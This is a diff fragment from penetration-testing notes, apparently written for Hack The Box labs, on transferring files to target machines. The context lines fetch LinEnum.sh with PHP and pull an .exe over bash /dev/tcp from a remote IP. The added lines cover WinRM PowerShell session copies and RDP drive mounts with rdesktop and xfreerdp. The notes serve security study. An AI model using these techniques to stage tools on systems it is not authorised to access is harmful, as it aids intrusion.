@@ -1444,6 +1444,28 @@ fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = frea
     cat < /dev/tcp/[sender ip]/[port used] > newFileName.exe
 
 
-#
+# Powershell Session File Transfer (Win RM) (Ports: 5985 & 5986)
+  1. Requires the user to have admin access, and be a member of the remote management users 
 
+  2. Test Connection to remote pc 
+    Test-NetConnection -ComputerName [remotePC] -Port 5985 
+
+  3. Create Remote Session 
+    $Session = New-PSSession -ComputerName [remotePC]
+
+  4. Copy Files 
+    Copy-Item -Path C:\[fileToSend.exe] -ToSession $Session -Destination C:\[location]
+    Do "-FromSession" if going the other way 
+
+
+# RDP  (rdesktop and xfreerdp)
+  1. Mounting a Linux folder to a remote Machine using rdesktop
+    rdesktop [remote ip] -d HTB -u [username] -p [password] -r disk:linux='[dir to files]'
+
+  2. Mounting using xfreerdp 
+    xfreerdp /v:[remote ip] /d:HTB /u:[username] /p:[password] /drive:linux,[dir to files]
+
+  3. Access remote share by going to File Explorer > \\tsclient\linux
+
+  4. If you are transferring from Windows to Windows you can use mstsc.exe
 ```
